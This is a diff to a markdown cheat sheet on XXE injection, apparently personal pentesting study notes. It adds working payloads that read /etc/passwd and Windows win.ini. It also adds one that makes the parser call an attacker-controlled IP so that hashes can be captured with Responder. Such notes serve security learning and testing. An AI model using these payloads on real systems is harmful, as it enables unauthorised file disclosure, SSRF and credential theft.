@@ -1,20 +1,23 @@
-# XXE Vulnerablity
+# XXE Injection
 
-XML external entity injection (also known as XXE) is a web security vulnerability that enables an attacker to interfere with the processing of XML data within a web application. XXE vulnerabilities arise due to the XML specification contains various potentially dangerous features, and standard parsers support these features even if they are not normally used by the application.
+XML External Entity injection (XXE) - [OWASP](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing) *"is a type of attack against an application that parses XML input. This attack occurs when **XML input containing a reference to an external entity is processed by a weakly configured XML parser**. This attack may lead to the disclosure of confidential data, denial of service, server side request forgery, port scanning from the perspective of the machine where the parser is located, and other system impacts."*
 
 ## XXE to retrieve files
+
 Portswigger example of stock level in  shopping application:
 `<?xml version="1.0" encoding="UTF-8"?> <stockCheck><productId>381</productId></stockCheck>`
 
 `<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> <stockCheck><productId>&xxe;</productId></stockCheck>`
 
 ## XXE to SSRF attacks
+
 `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>`
 
 3. Blind XXE to exfiltrate data out-of-band
 4. Blind XXE to retrieve data via error messages
 
 ## XXE XML Entity injection
+
 See [[XML-Basics]] for more about XML
 ```xml
 <!--Last Line of Request -->
@@ -26,7 +29,7 @@ See [[XML-Basics]] for more about XML
 ]> 
 <xmlEntityInjection>
 	<Author>Hacker1</Author> 
-	<Subject>&file;</Subject>>
+	<Subject>&file;</Subject>
 	<Content>LearnDaXMLs3</Content>
 </xmlEntityInjection>
 
@@ -37,6 +40,37 @@ See [[XML-Basics]] for more about XML
 <!-- The two section must connect -->
 ```
 [PayloadsAllTheThings - XXE ](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/Files/Classic%20XXE%20-%20etc%20passwd.xml)
+
+To examplify, simplify the above and enumerate the OS with Arbituary File Read
+```xml
+<!-- Either:  -->
+<!-- SYSTEM "/etc/passwd"  -->
+<!-- SYSTEM "file:///etc/passwd"  -->
+
+<!--Windows  -->
+
+<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]>
+<!--Entity is injected somewhere   -->
+<placetoinject>
+	&test;
+</placetoinject>
+
+<!--Linux  -->
+
+<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
+<!--Entity is injected somewhere   -->
+<placetoinject>
+	&test;
+</placetoinject>
+```
+
+XXE abuse [[Server-Side-Request-Forgery]] - and capture hashes with [[Responder-Cheatsheet]]
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://$yourIP$/test"> ]>
+<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
+```
+The above is modified from HackTricks - [check Hacktricks for Blind SSRF, DTD abuse and others](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)
 
 ## Mediation
 
